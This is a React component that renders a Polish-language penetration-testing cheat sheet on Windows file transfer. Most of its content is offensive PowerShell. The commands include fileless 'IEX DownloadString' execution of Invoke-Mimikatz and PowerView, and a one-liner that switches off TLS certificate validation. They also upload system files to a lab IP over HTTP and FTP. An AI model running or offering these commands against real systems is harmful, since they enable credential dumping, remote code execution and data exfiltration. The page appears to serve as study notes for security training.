import fileTransferWindows from '../../assets/file-transfer-windows.png';
import ExampleFrame from '../exampleFrame/ExampleFrame';

const FileTransfer = () => {
    return(
        <section>
            <h1>File transfer windows</h1>
            <ExampleFrame screen={fileTransferWindows} />
            <hr />
            <h2>PowerShell Web Downloads</h2>

            <div className='waring'>
                <p>(New-Object Net.WebClient).DownloadFile(<span className='important'>{`'<Target File URL>','<Output File Name>'`}</span>)</p>
                <p> Przykład (New-Object Net.WebClient).DownloadFile(<span className='important'>'https://raw.githubusercontent.com/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1'</span>)</p>
                <br />
                <p>(New-Object Net.WebClient).DownloadFileAsync(<span className='important'>{`'<Target File URL>','<Output File Name>'`}</span>)</p>
                <p> Przykład (New-Object Net.WebClient).DownloadFileAsync(<span className='important'>'https://raw.githubusercontent.com/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1'</span>)</p>
            </div>

            <hr />
            <h2>PowerShell DownloadString - Fileless Method</h2>
            <p>Uruchamianie skryptu bez jego pobierania</p>

            <div className='waring'>
                <p>IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')</p>
                <br />
                <p>(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX</p>
                <br />
                <p>W przypadku problemów z certyfikatem <span className='important'>[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {`{$true}`}</span></p>
            </div>

            <hr />
            <h2>PowerShell Invoke-WebRequest (curl/ wget)</h2>

            <div className='waring'>
                <p>Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1</p>
                <br />
                <p>W przypadku pierwszego uruchomienia bez konfiguracji dodajemy <span className='important'>-UseBasicParsing</span></p>
                <p>Invoke-WebRequest https://{`<ip>`}/PowerView.ps1 <span className='important'>-UseBasicParsing</span> | IEX</p>
            </div>

            <hr />
            <h2>Pobieranie plików FTP</h2>

            <div className='waring'>
                <p>(New-Object Net.WebClient).DownloadFile('<span className='important'>ftp</span>://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')</p>
            </div>

            <hr />
            <h2>Upload file</h2>

            <div className='waring'>
                <p>pip3 install uploadserver</p>
                <p>python3 -m uploadserver</p>
            </div>

            <div className='waring'>
                <p>PowerShell</p>
                <p>Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts</p>
            </div>

            <hr />
            <h2>Upload FTP files</h2>

            <div className='important'>
                <p>(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')</p>
            </div>
            
        </section>
    )
}

export default FileTransfer;